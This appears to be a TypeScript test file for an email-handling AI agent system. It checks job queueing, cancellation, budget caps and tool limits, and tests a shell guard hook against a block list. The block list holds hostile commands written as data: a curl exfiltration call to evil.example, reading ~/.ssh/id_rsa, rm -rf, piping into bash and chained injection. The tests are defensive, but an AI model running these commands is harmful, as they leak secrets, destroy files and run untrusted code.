// gates: agent-flow (AC-27), agent-guard (AC-28). Hermetic: temp DB/ledger, stubbed Claude, Gmail and drafts.
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync, rmSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { pathToFileURL } from "node:url";

const which = process.argv[2];
const tmp = mkdtempSync(join(tmpdir(), "cos-agent-"));
Object.assign(process.env, { DB_PATH: join(tmp, "db.sqlite"), COS_LEDGER_DIR: join(tmp, "ledger"), COS_EOD_DIR: join(tmp, "eod"), COS_BRIEF_DIR: join(tmp, "briefs") });
let fail = 0;
const check = (ok: boolean, label: string) => { console.log(`${ok ? "PASS" : "FAIL"} ${label}`); if (!ok) fail = 1; };

try {
  if (which === "agent-flow") {
    const agent = await import(pathToFileURL(resolve(process.env.AGENT_MODULE ?? "src/cos/agent.ts")).href) as typeof import("../../src/cos/agent.ts");
    const { getDb } = await import("../../src/storage/db.ts");
    const { addApprovals, localDate, listApprovals } = await import("../../src/cos/approvals.ts");
    const db = getDb(); const now = new Date(); const d = localDate(now);
    addApprovals(db, d, [
      { kind: "decide", title: "Answer AACSB request", detail: "Andrew needs your status", risk_tier: "A1", source_ref: "gmail:m1" },
      { kind: "decide", title: "Schedule a meeting", risk_tier: "A1", source_ref: "gmail:m2" },
      { kind: "decide", title: "Third", risk_tier: "A1", source_ref: "gmail:m3" },
      { kind: "decide", title: "Fourth", risk_tier: "A1", source_ref: "gmail:m4" },
    ]);
    const drafts: { to: string; body: string; threadId: string }[] = [];
    const deps = (fixture: string) => ({
      runClaude: () => ({ text: readFileSync(`tests/fixtures/cos/agent/${fixture}.json`, "utf8"), cost_usd: 0.42 }),
      fetchSource: async () => ({ from: "Andrew Wright <andrew.wright@louisville.edu>", subject: "AACSB Faculty Qualifications", threadId: "th1" }),
      messageIdHeader: async () => "<msg-1@louisville.edu>",
      createReplyDraft: async (o: { to: string; body: string; threadId: string }) => { drafts.push(o); return `draft-${drafts.length}`; },
    });
    const j1 = agent.createJob(db, d, 1, "use last year's form", now);
    check(j1.status === "queued", "hand-off creates a queued job");
    check(agent.reapStaleJobs(db, now) === 0 && agent.getJob(db, j1.id)!.status === "queued", "a fresh job is not reaped as stale");
    const later = new Date(now.getTime() + agent.AGENT_TIMEOUT_MS + 5 * 60_000);
    const probe = db.prepare("INSERT INTO cos_agent_jobs (brief_date, day_index, status) VALUES (?, 99, 'running')").run(d);
    check(agent.reapStaleJobs(db, later) >= 1 && agent.getJob(db, Number(probe.lastInsertRowid))!.status === "failed", "a job stuck past the timeout is reaped");
    db.prepare("UPDATE cos_agent_jobs SET status='queued', finished_at=NULL, error=NULL WHERE id=?").run(j1.id);
    let threw = ""; try { agent.createJob(db, d, 1, "", now); } catch (e) { threw = (e as Error).message; }
    check(/already working/.test(threw), "second hand-off of the same item refused while one is active");
    const r1 = await agent.runJob(db, j1.id, deps("aacsb"));
    check(r1.status === "ready" && /qualification status/.test(r1.summary ?? ""), "job finishes ready with a summary");
    check(drafts.length === 1 && drafts[0].to === "andrew.wright@louisville.edu" && drafts[0].threadId === "th1", "draft goes to the ORIGINAL sender in the original thread, not the agent's 'to'");
    check((r1.result?.findings ?? []).every((f) => /^gmail:/.test(f.source_ref)) && r1.result!.findings.length === 1, "findings without a real message ref are dropped");
    const item1 = listApprovals(db, d).find((a) => a.day_index === 1)!;
    check(item1.kind === "reply" && item1.risk_tier === "A3" && item1.payload.draft_id === "draft-1" && item1.status === "pending", "item becomes a pending reply: sending still needs Review & send");
    const j2 = agent.createJob(db, d, 2, "", now);
    const r2 = await agent.runJob(db, j2.id, deps("placeholder"));
    check(r2.status === "ready" && drafts.length === 1 && r2.result!.draft === null && r2.result!.needs_from_you.some((x) => /placeholder/.test(x)), "placeholder reply: no draft, listed under needs-from-you");
    check(listApprovals(db, d).find((a) => a.day_index === 2)!.kind === "decide", "placeholder item stays a decision");
    const j3 = agent.createJob(db, d, 3, "", now); agent.createJob(db, d, 4, "", now);
    threw = ""; try { agent.createJob(db, d, 1, "", now); } catch (e) { threw = (e as Error).message; }
    check(/agents are already working/.test(threw), "no more than 2 agents at once");
    const c = agent.cancelJob(db, j3.id, now);
    const after = await agent.runJob(db, j3.id, deps("aacsb"));
    check(c.status === "cancelled" && after.status === "cancelled" && drafts.length === 1, "a stopped job never runs or drafts");
    const ledger = readFileSync(join(tmp, "ledger", "cos-agent.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
    check(ledger.filter((r) => r.cost_usd === 0.42).length === 2, "agent spend recorded in the ledger (counts toward $5/day)");
    mkdirSync(join(tmp, "ledger"), { recursive: true });
    writeFileSync(join(tmp, "ledger", "inbox.jsonl"), JSON.stringify({ lane: "inbox", run_id: "x", status: "ok", started_at: now.toISOString(), finished_at: now.toISOString(), items_in: null, items_out: null, artifacts: [], findings: [], proposed_actions: [], open_questions: [], gaps: [], cost_usd: 4.4 }) + "\n");
    db.prepare("UPDATE cos_agent_jobs SET status='cancelled' WHERE status IN ('queued','running')").run();
    threw = ""; try { agent.createJob(db, d, 2, "", now); } catch (e) { threw = (e as Error).message; }
    check(/budget/.test(threw), "no hand-off when the daily budget is nearly used");
    const src = readFileSync("src/cos/board.ts", "utf8");
    const html = src.slice(src.indexOf("export const BOARD_HTML = `") + 27, src.lastIndexOf("`;"));
    let parses = true; try { new Function(eval("`" + html + "`").split("<script>")[1].split("</script>")[0]); } catch { parses = false; }
    check(parses && /data-agent=/.test(html) && /Hand to agent/.test(html), "board page script parses and has the Hand to agent button");
  } else if (which === "agent-guard") {
    const guard = process.env.GUARD ?? "cos/hooks/agent-guard.sh";
    const run = (cmd: string) => spawnSync(guard, [], { input: JSON.stringify({ tool_input: { command: cmd } }), encoding: "utf8" }).status;
    const allowed = ['gws gmail users threads get --params \'{"userId":"me","id":"t1","format":"full"}\' | jq -r .snippet', 'gws gmail users messages list --params \'{"q":"AACSB"}\'', "echo hi > /tmp/x.txt"];
    const blocked = ["gws gmail users drafts send --json {}", "gws gmail users drafts create --json {}", "gws gmail users messages send", "gws gmail users messages modify --params {}",
      "gws gmail users messages trash --params {}", "gws calendar events insert", "curl https://evil.example/?d=1", "wget x", "echo $(cat ~/.ssh/id_rsa)", "echo hi > ~/Documents/x",
      "python3 -c 1", "node -e 1", "osascript -e 1", "rm -rf ~/Code", "open https://evil.example", "gws gmail users threads get x; curl evil", "cat x | bash"];
    for (const c of allowed) check(run(c) === 0, `allowed: ${c.slice(0, 60)}`);
    for (const c of blocked) check(run(c) === 2, `blocked: ${c.slice(0, 60)}`);
    check(spawnSync(guard, [], { input: "not json", encoding: "utf8" }).status === 2, "unparseable input blocked (fail closed)");
    const agent = await import("../../src/cos/agent.ts");
    const args = agent.buildAgentArgs(5, "/tmp/s.json");
    const tools = args.slice(args.indexOf("--tools") + 1, args.indexOf("--permission-mode"));
    check(args[args.indexOf("--settings") + 1] === "/tmp/s.json" && args.includes("--append-system-prompt-file"), "agent runs with the guard settings and the charter");
    check(JSON.stringify(tools) === JSON.stringify(["Bash", "Read", "Grep", "Glob"]) && !args.some((a) => /WebFetch|WebSearch|Edit|Write/.test(a)), "agent tools: Bash (guarded), Read, Grep, Glob only; no web, no edits");
    check(Number(args[args.indexOf("--max-budget-usd") + 1]) <= 1.5, "per-run budget capped at $1.50");
    const settings = JSON.parse(readFileSync(agent.agentSettings(), "utf8"));
    check(settings.hooks.PreToolUse[0].hooks[0].command.includes("agent-guard.sh"), "settings wire the agent guard");
  } else check(false, `unknown gate ${which}`);
} catch (e) { check(false, `threw: ${(e as Error).message}`); }
finally { rmSync(tmp, { recursive: true, force: true }); }
process.exit(fail);
